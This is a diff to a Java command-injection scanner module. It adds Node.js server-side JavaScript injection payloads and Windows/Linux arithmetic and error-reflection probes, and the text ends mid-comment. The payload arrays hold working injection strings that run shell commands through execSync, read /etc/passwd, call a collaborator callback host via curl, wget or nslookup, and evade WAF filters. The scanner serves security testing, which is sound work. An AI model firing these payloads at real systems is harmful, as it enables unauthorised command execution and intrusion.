@@ -16,6 +16,7 @@ import com.omnistrike.framework.TimingLock;
 import com.omnistrike.model.*;
 
 import java.nio.charset.StandardCharsets;
+import java.security.SecureRandom;
 import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.atomic.AtomicReference;
@@ -36,6 +37,8 @@ public class CommandInjectionScanner implements ScanModule {
     private CollaboratorManager collaboratorManager;
     // Parameters confirmed exploitable via OOB — skip all remaining phases for these
     private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
+
+    private static final SecureRandom SECURE_RANDOM = new SecureRandom();
 
     // Command separators for both Unix and Windows
     private static final String[] UNIX_SEPARATORS = {
@@ -123,10 +126,10 @@ public class CommandInjectionScanner implements ScanModule {
     // Generic strings like "Linux", "42", "bin", "inet" are NOT used — they appear on normal web pages.
     private static final String[][] OUTPUT_PAYLOADS_UNIX = {
             // id command — require full id output format: uid=N(user) gid=N
-            {";id;", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id command (Unix)"},
-            {"|id|", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id command piped (Unix)"},
-            {"$(id)", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id via subshell (Unix)"},
-            {"`id`", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id via backtick (Unix)"},
+            {";id;", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id command (Unix)"},
+            {"|id|", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id command piped (Unix)"},
+            {"$(id)", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id via subshell (Unix)"},
+            {"`id`", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id via backtick (Unix)"},
             // /etc/passwd — root:x:0:0: is definitive
             {";cat /etc/passwd;", "root:x:0:0:", "/etc/passwd read (Unix)"},
             {"|cat /etc/passwd", "root:x:0:0:", "/etc/passwd piped (Unix)"},
@@ -135,7 +138,7 @@ public class CommandInjectionScanner implements ScanModule {
             {";uname -a;", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname (Unix)"},
             {"|uname -a", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname piped (Unix)"},
             // Newline separator
-            {"%0aid%0a", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id via newline (Unix)"},
+            {"%0aid%0a", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id via newline (Unix)"},
             // $IFS space bypass
             {";cat${IFS}/etc/passwd;", "root:x:0:0:", "/etc/passwd via IFS (Unix)"},
             // expr math marker — unique 6-digit number to avoid matching natural page content
@@ -255,6 +258,77 @@ public class CommandInjectionScanner implements ScanModule {
             {"& curl http://COLLAB_PLACEHOLDER/cmdi &", "curl (Windows)"},
     };
 
+    // ─────────────────────────────────────────────────────────────────────────
+    // Node.js Server-Side JavaScript Injection (SSJI) Payloads
+    // Used ONLY for JSON body parameters (CmdiTargetType.JSON).
+    //
+    // Each payload breaks out of a common Node.js eval/template context, then
+    // executes a shell command via require('child_process').execSync(). The
+    // trailing // is a JS single-line comment that silences any remaining
+    // characters from the surrounding eval string, preventing syntax errors.
+    //
+    // Context breakers cover the most common server-side eval idioms:
+    //   '       → eval("'" + input + "'")
+    //   ')      → eval(someFunc(input))
+    //   '})     → eval(fn({key: input}))     ← most common real-world pattern
+    //   '))     → eval(outer(inner(input)))
+    //   '}}))   → eval(outer({key: inner({k: input})}))  ← seen in HTB challenges
+    //
+    // WAF bypass variants replace bare require() with global.process.mainModule.require()
+    // to evade keyword filters that block 'require'.
+    //
+    // COLLAB_PLACEHOLDER / SLEEP_SECS are substituted at runtime.
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private static final String[][] NODEJS_OOB_PAYLOADS = {
+            // curl HTTP callback — five context breakers
+            {"' + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",      "require+curl (bare-quote)"},
+            {"') + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",     "require+curl (close-paren)"},
+            {"'}) + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",    "require+curl (obj+paren)"},
+            {"')) + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",    "require+curl (dbl-paren)"},
+            {"'}})) + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",  "require+curl (dbl-obj+dbl-paren)"},
+            // wget as curl alternative (some containers have wget but not curl)
+            {"' + require('child_process').execSync('wget -q http://COLLAB_PLACEHOLDER/ssji').toString()//",   "require+wget (bare-quote)"},
+            {"'}) + require('child_process').execSync('wget -q http://COLLAB_PLACEHOLDER/ssji').toString()//", "require+wget (obj+paren)"},
+            // DNS via nslookup / ping — works even when HTTP egress is blocked
+            {"' + require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()//",              "require+nslookup (bare-quote)"},
+            {"'}) + require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()//",            "require+nslookup (obj+paren)"},
+            {"' + require('child_process').execSync('ping -c 1 COLLAB_PLACEHOLDER').toString()//",             "require+ping (bare-quote)"},
+            // WAF bypass: global.process.mainModule.require() avoids the bare 'require' keyword
+            {"' + global.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",    "global.process+curl (bare-quote)"},
+            {"'}) + global.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",  "global.process+curl (obj+paren)"},
+            {"' + global.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()//",            "global.process+nslookup (bare-quote)"},
+            // IIFE WAF bypass — hides 'require' behind a variable reference
+            {"' + (()=>{const r=global.process.mainModule.require;return r('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()})()//", "IIFE+global.process+curl"},
+    };
+
+    // SLEEP_SECS is replaced with the configured delay at runtime (same mechanic as UNIX_TIME_PAYLOADS)
+    private static final String[][] NODEJS_TIME_PAYLOADS = {
+            {"' + require('child_process').execSync('sleep SLEEP_SECS').toString()//",     "require+sleep (bare-quote)"},
+            {"') + require('child_process').execSync('sleep SLEEP_SECS').toString()//",    "require+sleep (close-paren)"},
+            {"'}) + require('child_process').execSync('sleep SLEEP_SECS').toString()//",   "require+sleep (obj+paren)"},
+            {"')) + require('child_process').execSync('sleep SLEEP_SECS').toString()//",   "require+sleep (dbl-paren)"},
+            {"'}})) + require('child_process').execSync('sleep SLEEP_SECS').toString()//", "require+sleep (dbl-obj+dbl-paren)"},
+            // WAF bypass
+            {"' + global.process.mainModule.require('child_process').execSync('sleep SLEEP_SECS').toString()//",   "global.process+sleep (bare-quote)"},
+            {"'}) + global.process.mainModule.require('child_process').execSync('sleep SLEEP_SECS').toString()//", "global.process+sleep (obj+paren)"},
+    };
+
+    // Output-based: [payload, expectedOutput, technique] — same format as OUTPUT_PAYLOADS_UNIX
+    private static final String[][] NODEJS_OUTPUT_PAYLOADS = {
+            // id — uid=N(user) gid=N output is unmistakable and cannot be produced by input reflection
+            {"' + require('child_process').execSync('id').toString()//",     "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "execSync id (bare-quote)"},
+            {"'}) + require('child_process').execSync('id').toString()//",   "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "execSync id (obj+paren)"},
+            {"')) + require('child_process').execSync('id').toString()//",   "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "execSync id (dbl-paren)"},
+            {"'}})) + require('child_process').execSync('id').toString()//", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "execSync id (dbl-obj+dbl-paren)"},
+            // /etc/passwd — root:x:0:0: is definitive
+            {"' + require('child_process').execSync('cat /etc/passwd').toString()//",   "root:x:0:0:", "execSync cat /etc/passwd (bare-quote)"},
+            {"'}) + require('child_process').execSync('cat /etc/passwd').toString()//", "root:x:0:0:", "execSync cat /etc/passwd (obj+paren)"},
+            // WAF bypass variants
+            {"' + global.process.mainModule.require('child_process').execSync('id').toString()//",   "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "global.process execSync id (bare-quote)"},
+            {"'}) + global.process.mainModule.require('child_process').execSync('id').toString()//", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "global.process execSync id (obj+paren)"},
+    };
+
     @Override
     public String getId() { return "cmdi-scanner"; }
 
@@ -330,6 +404,12 @@ public class CommandInjectionScanner implements ScanModule {
         if (config.getBool("cmdi.oob.enabled", true)
                 && collaboratorManager != null && collaboratorManager.isAvailable()) {
             testOob(original, target, url);
+            // Fire SSJI OOB callbacks immediately for JSON params — do NOT wait behind Phase 5
+            // time-based tests. Without this, SSJI callbacks would only fire after 30+ minutes
+            // of traditional time-based probing (18s × many payloads × 3 verification steps).
+            if (target.type == CmdiTargetType.JSON && config.getBool("cmdi.nodejs.enabled", true)) {
+                testNodejsOob(original, target, url);
+            }
         }
 
         // Phase 2: Baseline (multi-measurement for accuracy)
@@ -352,33 +432,59 @@ public class CommandInjectionScanner implements ScanModule {
         // (WAF blocks, routing changes, logging errors) unrelated to command execution.
         // Headers are only tested via time-based (below).
         if (oobConfirmedParams.contains(target.name)) return;
+        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
         if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
             if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_UNIX, "Unix")) return;
         }
 
         // Phase 4: Output-based detection (Windows)
         if (oobConfirmedParams.contains(target.name)) return;
+        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
         if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
             if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_WINDOWS, "Windows")) return;
         }
 
-        // Phase 5: Time-based blind (LAST — serialized via TimingLock)
-        // Gated by global TimingLock.isEnabled() checkbox
+        // Phase 4b: Windows math + error detection (dynamic operands, independent probes).
         if (oobConfirmedParams.contains(target.name)) return;
-        if (!TimingLock.isEnabled()) return;
-        try {
-            TimingLock.acquire();
-            if (config.getBool("cmdi.unix.enabled", true)) {
-                if (testTimeBased(original, target, url, baselineTime, delaySecs, UNIX_TIME_PAYLOADS, "Unix")) return;
+        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
+            if (testWindowsEchoError(original, target, url, baselineBody)) return;
+        }
+
+        // Phase 4c: Linux math + error detection (dynamic operands, independent probes).
+        // Catches apps that surface stdout (expr result) or stderr (sh/bash/zsh "not found" errors).
+        if (oobConfirmedParams.contains(target.name)) return;
+        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
+            if (testLinuxMathError(original, target, url, baselineBody)) return;
+        }
+
+        // Phase 5: Time-based blind — serialized via TimingLock; skipped when the UI toggle is off
+        if (oobConfirmedParams.contains(target.name)) return;
+        if (TimingLock.isEnabled()) {
+            try {
+                TimingLock.acquire();
+                if (config.getBool("cmdi.unix.enabled", true)) {
+                    if (testTimeBased(original, target, url, baselineTime, delaySecs, UNIX_TIME_PAYLOADS, "Unix")) return;
+                }
+                if (config.getBool("cmdi.windows.enabled", true)) {
+                    if (testTimeBased(original, target, url, baselineTime, delaySecs, WINDOWS_TIME_PAYLOADS, "Windows")) return;
+                }
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            } finally {
+                TimingLock.release();
             }
-            if (config.getBool("cmdi.windows.enabled", true)) {
-                if (testTimeBased(original, target, url, baselineTime, delaySecs, WINDOWS_TIME_PAYLOADS, "Windows")) return;
-            }
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-            return;
-        } finally {
-            TimingLock.release();
+        }
+
+        // Phase 6: Node.js Server-Side JavaScript Injection — JSON parameters only.
+        // OOB and output-based sub-phases always run; time-based sub-phase respects the
+        // same TimingLock.isEnabled() gate as Phase 5.
+        if (oobConfirmedParams.contains(target.name)) return;
+        if (target.type == CmdiTargetType.JSON && config.getBool("cmdi.nodejs.enabled", true)) {
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+            testNodejsInjection(original, target, url, baselineTime, baselineBody, delaySecs);
         }
     }
 
@@ -478,11 +584,6 @@ public class CommandInjectionScanner implements ScanModule {
             HttpRequestResponse result = sendPayload(original, target, target.originalValue + payload);
             if (result == null || result.response() == null) continue;
             if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }
-            // Skip ALL 4xx responses — command execution produces 200, not error codes
-            if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) continue;
-
-            // Skip small error pages (5xx with body < 500 bytes)
-            if (isSmallErrorPage(result)) continue;
 
             String body = result.response().bodyToString();
             // Empty body is never evidence of command execution
@@ -535,6 +636,476 @@ public class CommandInjectionScanner implements ScanModule {
             perHostDelay();
         }
         return false;
+    }
+
+    // ==================== WINDOWS MATH + ERROR DETECTION ====================
+
+    /**
+     * Windows command injection verification via two independent probes.
+     *
+     * <p>Either probe passing is sufficient to confirm injection. False-positive protection
+     * comes from the randomness of the values — no pre-existing page content can coincidentally
+     * match either check:</p>
+     *
+     * <ul>
+     *   <li><b>Probe A (stdout)</b>: Injects {@code <sep> set /a a*b <sep>} with random operands.
+     *       The shell computes and outputs the product. Input reflection cannot produce the
+     *       computed answer — covers apps that return stdout but suppress stderr.</li>
+     *   <li><b>Probe B (stderr)</b>: Injects {@code <sep> <random_12alpha_cmd> <sep>}.
+     *       The Windows error {@code '<random_cmd>' is not recognized...} containing our specific
+     *       random string is independently conclusive — covers apps that surface stderr but
+     *       suppress stdout.</li>
+     * </ul>
+     *
+     * <p>Fresh random values are generated per probe per separator so repeated invocations
+     * never share markers — no dedup pollution across parameters.</p>
+     */
+    private boolean testWindowsEchoError(HttpRequestResponse original, CmdiTarget target,
+                                          String url, String baselineBody)
+            throws InterruptedException {
+
+        // [prefix, suffix] separator pairs — mirrors the existing Windows output payloads format
+        String[][] seps = {
+            {"& ",  " &"},
+            {"&& ", " &&"},
+            {"| ",  ""},
+            {"\n",  "\n"},
+            {"; ",  ""},
+        };
+
+        for (String[] sep : seps) {
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+            String pre = sep[0];
+            String suf = sep[1];
+
+            // ── Probe A: stdout path (arithmetic calculation) ────────────────────
+            // "set /a a*b" outputs only the computed result — the shell consumes the
+            // expression entirely. Input reflection can never produce the answer, so no
+            // anti-reflection guard is needed.
+            int    a           = 1000 + SECURE_RANDOM.nextInt(9000);
+            int    b           = 1000 + SECURE_RANDOM.nextInt(9000);
+            String expected    = String.valueOf((long) a * b);
+            String mathPayload = pre + "set /a " + a + "*" + b + suf;
+            HttpRequestResponse mathResult = sendPayload(original, target, target.originalValue + mathPayload);
+            if (mathResult != null && mathResult.response() != null && ResponseGuard.isUsableResponse(mathResult)) {
+                String mathBody = mathResult.response().bodyToString();
+                if (mathBody != null && mathBody.contains(expected) && !baselineBody.contains(expected)) {
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Math Calculation) - Windows",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Probe A (stdout): payload='" + mathPayload + "' | computed result '"
+                                    + expected + "' (" + a + "*" + b + ") in response, absent in baseline")
+                            .description("Windows OS command injection confirmed via arithmetic calculation. "
+                                    + "'set /a " + a + "*" + b + "' was injected; the server returned "
+                                    + "the computed result '" + expected + "' in the response body. "
+                                    + "Only actual shell execution can produce this value — "
+                                    + "input reflection cannot compute the answer. "
+                                    + "Parameter '" + target.name + "' allows arbitrary Windows command execution.")
+                            .responseEvidence(expected)
+                            .payload(mathPayload)
+                            .requestResponse(mathResult)
+                            .build());
+                    return true;
+                }
+            }
+            perHostDelay();
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+
+            // ── Probe A2: PowerShell arithmetic (secondary stdout path) ──────────
+            // Different execution path from set /a — bypasses filters that block cmd builtins.
+            // powershell outputs only the numeric result; reflection cannot produce the answer.
+            int    a2      = 1000 + SECURE_RANDOM.nextInt(9000);
+            int    b2      = 1000 + SECURE_RANDOM.nextInt(9000);
+            String exp2    = String.valueOf((long) a2 * b2);
+            String psPayload = pre + "powershell -NonInteractive -NoProfile -command \"" + a2 + "*" + b2 + "\"" + suf;
+            HttpRequestResponse psResult = sendPayload(original, target, target.originalValue + psPayload);
+            if (psResult != null && psResult.response() != null && ResponseGuard.isUsableResponse(psResult)) {
+                String psBody = psResult.response().bodyToString();
+                if (psBody != null && psBody.contains(exp2) && !baselineBody.contains(exp2)) {
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Math Calculation via PowerShell) - Windows",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Probe A2 (PowerShell): payload='" + psPayload + "' | computed result '"
+                                    + exp2 + "' (" + a2 + "*" + b2 + ") in response, absent in baseline")
+                            .description("Windows OS command injection confirmed via PowerShell arithmetic. "
+                                    + "'powershell -command " + a2 + "*" + b2 + "' was injected; "
+                                    + "the server returned the computed result '" + exp2 + "'. "
+                                    + "Only actual PowerShell execution can produce this value. "
+                                    + "Parameter '" + target.name + "' allows arbitrary Windows command execution.")
+                            .responseEvidence(exp2)
+                            .payload(psPayload)
+                            .requestResponse(psResult)
+                            .build());
+                    return true;
+                }
+            }
+            perHostDelay();
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+
+            // ── Probe B: stderr path (error reflection) ──────────────────────────
+            // Fresh fake command per probe — the error text contains OUR specific random string,
+            // making it independently unforgeable even without stdout confirmation.
+            String fakeCmd     = randomAlpha(12);
+            String errorPayload = pre + fakeCmd + suf;
+            HttpRequestResponse errorResult = sendPayload(original, target, target.originalValue + errorPayload);
+            if (errorResult != null && errorResult.response() != null && ResponseGuard.isUsableResponse(errorResult)) {
+                String errorBody = errorResult.response().bodyToString();
+                // Windows error phrase — check all single-quote encodings the app may emit:
+                //   literal: 'fakeCmd' is not recognized...
+                //   HTML decimal entity: &#39;fakeCmd&#39; is not recognized...
+                //   XHTML named entity:  &apos;fakeCmd&apos; is not recognized...
+                String suffix       = fakeCmd + "' is not recognized as an internal or external command";
+                String litForm      = "'" + suffix;
+                String htmlForm     = "&#39;" + fakeCmd + "&#39; is not recognized as an internal or external command";
+                String aposForm     = "&apos;" + fakeCmd + "&apos; is not recognized as an internal or external command";
+                boolean inBody      = errorBody != null &&
+                                      (errorBody.contains(litForm) || errorBody.contains(htmlForm) || errorBody.contains(aposForm));
+                boolean inBaseline  = baselineBody.contains(litForm) || baselineBody.contains(htmlForm) || baselineBody.contains(aposForm);
+                if (inBody && !inBaseline) {
+                    // Use whichever form matched for evidence display
+                    String matchedForm = errorBody.contains(htmlForm) ? htmlForm
+                                       : errorBody.contains(aposForm) ? aposForm
+                                       : litForm;
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Error Reflection) - Windows",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Probe B (stderr): payload='" + errorPayload + "' | Windows error '"
+                                    + matchedForm + "' in response, absent in baseline")
+                            .description("Windows OS command injection confirmed via error reflection. "
+                                    + "The random non-existent command '" + fakeCmd + "' was injected and "
+                                    + "Windows returned its exact 'is not recognized' error message in the "
+                                    + "HTTP response, confirming the application surfaces stderr. "
+                                    + "Parameter '" + target.name + "' allows arbitrary Windows command execution.")
+                            .responseEvidence(matchedForm)
+                            .payload(errorPayload)
+                            .requestResponse(errorResult)
+                            .build());
+                    return true;
+                }
+            }
+            perHostDelay();
+        }
+        return false;
+    }
+
+    // ==================== LINUX MATH + ERROR DETECTION ====================
+
+    /**
+     * Linux command injection verification via two independent probes per separator.
+     *
+     * <ul>
+     *   <li><b>Probe A (stdout)</b>: {@code expr a \* b} with random operands. The shell outputs
+     *       only the computed product — no keyword in the output, so input reflection cannot
+     *       produce the answer. Covers apps that return stdout (e.g. Node child_process JSON).</li>
+     *   <li><b>Probe B (stderr)</b>: Random fake command. Checks for sh/dash
+     *       {@code "fakecmd: not found"}, bash {@code "fakecmd: command not found"}, and
+     *       zsh {@code "command not found: fakecmd"}. Covers apps that surface only stderr.</li>
+     * </ul>
+     */
+    private boolean testLinuxMathError(HttpRequestResponse original, CmdiTarget target,
+                                        String url, String baselineBody)
+            throws InterruptedException {
+
+        String[][] seps = {
+            {"; ", ";"},
+            {"\n", "\n"},
+            {"&& ", ""},
+            {"|| ", ""},
+            {"| ", ""},
+        };
+
+        for (String[] sep : seps) {
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+            String pre = sep[0];
+            String suf = sep[1];
+
+            // ── Probe A: stdout path (arithmetic via expr) ────────────────────
+            // expr outputs only the computed result — the shell consumes the expression.
+            // \* prevents glob expansion of * by the shell.
+            int    a          = 1000 + SECURE_RANDOM.nextInt(9000);
+            int    b          = 1000 + SECURE_RANDOM.nextInt(9000);
+            String expected   = String.valueOf((long) a * b);
+            String mathPayload = pre + "expr " + a + " \\* " + b + suf;
+            HttpRequestResponse mathResult = sendPayload(original, target, target.originalValue + mathPayload);
+            if (mathResult != null && mathResult.response() != null && ResponseGuard.isUsableResponse(mathResult)) {
+                String mathBody = mathResult.response().bodyToString();
+                if (mathBody != null && mathBody.contains(expected) && !baselineBody.contains(expected)) {
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Arithmetic Output) - Unix",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Probe A (stdout): payload='" + mathPayload + "' | computed result '"
+                                    + expected + "' (" + a + " * " + b + ") in response, absent in baseline")
+                            .description("Unix OS command injection confirmed via arithmetic output. "
+                                    + "'expr " + a + " \\* " + b + "' was injected; the server returned "
+                                    + "the computed result '" + expected + "' in the response body. "
+                                    + "Only actual shell execution can produce this value — "
+                                    + "input reflection cannot compute the answer. "
+                                    + "Parameter '" + target.name + "' allows arbitrary Unix command execution.")
+                            .responseEvidence(expected)
+                            .payload(mathPayload)
+                            .requestResponse(mathResult)
+                            .build());
+                    return true;
+                }
+            }
+            perHostDelay();
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+
+            // ── Probe A2: awk arithmetic (secondary stdout path) ──────────────
+            // Different binary from expr — bypasses filters that block expr specifically.
+            // BEGIN block runs before any input is read, so | piping doesn't interfere;
+            // exit prevents awk from hanging on stdin when used with pipe separators.
+            int    a2       = 1000 + SECURE_RANDOM.nextInt(9000);
+            int    b2       = 1000 + SECURE_RANDOM.nextInt(9000);
+            String exp2     = String.valueOf((long) a2 * b2);
+            String awkPayload = pre + "awk 'BEGIN{print " + a2 + "*" + b2 + "; exit}'" + suf;
+            HttpRequestResponse awkResult = sendPayload(original, target, target.originalValue + awkPayload);
+            if (awkResult != null && awkResult.response() != null && ResponseGuard.isUsableResponse(awkResult)) {
+                String awkBody = awkResult.response().bodyToString();
+                if (awkBody != null && awkBody.contains(exp2) && !baselineBody.contains(exp2)) {
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Arithmetic Output via awk) - Unix",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Probe A2 (awk): payload='" + awkPayload + "' | computed result '"
+                                    + exp2 + "' (" + a2 + "*" + b2 + ") in response, absent in baseline")
+                            .description("Unix OS command injection confirmed via awk arithmetic. "
+                                    + "'awk BEGIN{print " + a2 + "*" + b2 + "}' was injected; "
+                                    + "the server returned the computed result '" + exp2 + "'. "
+                                    + "Only actual awk execution can produce this value. "
+                                    + "Parameter '" + target.name + "' allows arbitrary Unix command execution.")
+                            .responseEvidence(exp2)
+                            .payload(awkPayload)
+                            .requestResponse(awkResult)
+                            .build());
+                    return true;
+                }
+            }
+            perHostDelay();
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+
+            // ── Probe B: stderr path (command not found) ──────────────────────
+            // sh/dash:  "fakecmd: not found"
+            // bash:     "fakecmd: command not found"
+            // zsh:      "command not found: fakecmd"
+            // Each shell variant contains our specific random fakeCmd — independently unforgeable.
+            String fakeCmd     = randomAlpha(12);
+            String errorPayload = pre + fakeCmd + suf;
+            HttpRequestResponse errorResult = sendPayload(original, target, target.originalValue + errorPayload);
+            if (errorResult != null && errorResult.response() != null && ResponseGuard.isUsableResponse(errorResult)) {
+                String errorBody    = errorResult.response().bodyToString();
+                boolean shForm      = errorBody != null && errorBody.contains(fakeCmd + ": not found");
+                boolean bashForm    = errorBody != null && errorBody.contains(fakeCmd + ": command not found");
+                boolean zshForm     = errorBody != null && errorBody.contains("command not found: " + fakeCmd);
+                boolean inBaseline  = baselineBody.contains(fakeCmd + ": not found")
+                                   || baselineBody.contains(fakeCmd + ": command not found")
+                                   || baselineBody.contains("command not found: " + fakeCmd);
+                if ((shForm || bashForm || zshForm) && !inBaseline) {
+                    String matchedForm = shForm   ? fakeCmd + ": not found"
+                                       : bashForm ? fakeCmd + ": command not found"
+                                       :            "command not found: " + fakeCmd;
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Error Reflection) - Unix",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Probe B (stderr): payload='" + errorPayload + "' | Unix shell error '"
+                                    + matchedForm + "' in response, absent in baseline")
+                            .description("Unix OS command injection confirmed via shell error reflection. "
+                                    + "The random non-existent command '" + fakeCmd + "' was injected and "
+                                    + "the shell returned its exact 'not found' error message in the "
+                                    + "HTTP response, confirming the application surfaces stderr. "
+                                    + "Parameter '" + target.name + "' allows arbitrary Unix command execution.")
+                            .responseEvidence(matchedForm)
+                            .payload(errorPayload)
+                            .requestResponse(errorResult)
+                            .build());
+                    return true;
+                }
+            }
+            perHostDelay();
+        }
+        return false;
+    }
+
+    /** Returns {@code len} random bytes encoded as lowercase hex. */
+    private static String randomHex(int bytes) {
+        byte[] b = new byte[bytes];
+        SECURE_RANDOM.nextBytes(b);
+        StringBuilder sb = new StringBuilder(bytes * 2);
+        for (byte x : b) sb.append(String.format("%02x", x));
+        return sb.toString();
+    }
+
+    /** Returns {@code len} random lowercase ASCII letters (a–z). */
+    private static String randomAlpha(int len) {
+        StringBuilder sb = new StringBuilder(len);
+        for (int i = 0; i < len; i++) {
+            sb.append((char) ('a' + SECURE_RANDOM.nextInt(26)));
+        }
+        return sb.toString();
+    }
+
+    // ==================== NODE.JS SSJI ====================
+
+    /**
+     * Node.js Server-Side JavaScript Injection — three sub-phases:
+     *   6a. JS arithmetic output (confirms eval injection without needing shell cmds)
+     *   6b. execSync output-based (id / /etc/passwd — confirms OS command execution)
+     *   6c. Time-based blind (gated by TimingLock — only when UI toggle is on)
+     *
+     * OOB has already been dispatched in Phase 1 alongside traditional OOB so that
+     * SSJI callbacks are not delayed behind 30+ minutes of time-based probing.
+     */
+    private void testNodejsInjection(HttpRequestResponse original, CmdiTarget target, String url,
+                                      long baselineTime, String baselineBody, int delaySecs)
+            throws InterruptedException {
+
+        // OOB already fired in Phase 1 — skip here and check if already confirmed.
+        if (oobConfirmedParams.contains(target.name)) return;
+
+        // Sub-phase 6a: JS arithmetic output — proves eval injection without requiring shell access.
+        // Injects (A*B).toString() with random operands per context breaker. The result is
+        // unforgeable by input reflection alone, and appears in the response even when the app
+        // passes the eval result to another function (unlike id/passwd which only appear if echoed).
+        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+        if (config.getBool("cmdi.output.enabled", true)) {
+            if (testNodejsMath(original, target, url, baselineBody)) return;
+        }
+        if (oobConfirmedParams.contains(target.name)) return;
+
+        // Sub-phase 6b: execSync output-based (id, /etc/passwd reflected in response body).
+        // Proves OS command execution when command output is surfaced in the JSON response.
+        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+        if (config.getBool("cmdi.output.enabled", true)) {
+            if (testOutputBased(original, target, url, baselineBody, NODEJS_OUTPUT_PAYLOADS, "Node.js SSJI")) return;
+        }
+        if (oobConfirmedParams.contains(target.name)) return;
+
+        // Sub-phase 6c: Time-based blind — requires the global "Time-Based Testing" UI toggle
+        if (!TimingLock.isEnabled()) return;
+        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+        try {
+            TimingLock.acquire();
+            testTimeBased(original, target, url, baselineTime, delaySecs, NODEJS_TIME_PAYLOADS, "Node.js SSJI");
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        } finally {
+            TimingLock.release();
+        }
+    }
+
+    // ==================== NODE.JS SSJI MATH PROBE ====================
+
+    /**
+     * Confirms JS eval injection via arithmetic output — SSJI equivalent of testLinuxMathError.
+     *
+     * <p>For each context breaker, injects {@code ORIGINAL + BREAKER + (A*B).toString()//} with
